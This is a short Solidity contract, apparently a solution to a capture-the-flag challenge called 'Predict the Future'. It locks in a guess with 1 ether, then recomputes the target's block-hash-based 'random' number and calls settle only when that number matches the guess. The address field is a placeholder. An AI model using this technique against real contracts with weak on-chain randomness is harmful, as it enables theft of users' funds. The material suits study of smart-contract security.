pragma solidity ^0.4.21;
contract attacker {
    PredictTheFutureChallenge target;
    uint public result;
    function attacker() public payable {
        target = PredictTheFutureChallenge(address of your challenge);
        target.lockInGuess.value(1 ether)(5);

    }

    function exploit() public payable {
        result = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
            if (result == 5) {
            target.settle();
        }

    }

    function () public payable {

    }
}